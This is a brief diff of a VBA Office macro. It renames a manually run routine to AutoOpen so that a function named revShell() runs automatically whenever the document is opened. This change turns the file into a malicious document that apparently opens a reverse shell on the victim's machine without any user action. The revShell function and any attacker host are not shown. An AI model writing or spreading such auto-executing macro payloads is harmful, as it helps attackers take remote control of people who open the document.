@@ -165,7 +165,12 @@ Public Function MAKEWORD(Lo As Byte, Hi As Byte) As Integer
     MAKEWORD = Lo + Hi * 256& Or 32768 * (Hi > 127)
 End Function
 
-Sub MyMacro()
+'Sub MyMacro()
+'    Dim success As Boolean
+'    success = revShell()
+'End Sub
+
+Sub AutoOpen()
     Dim success As Boolean
     success = revShell()
 End Sub
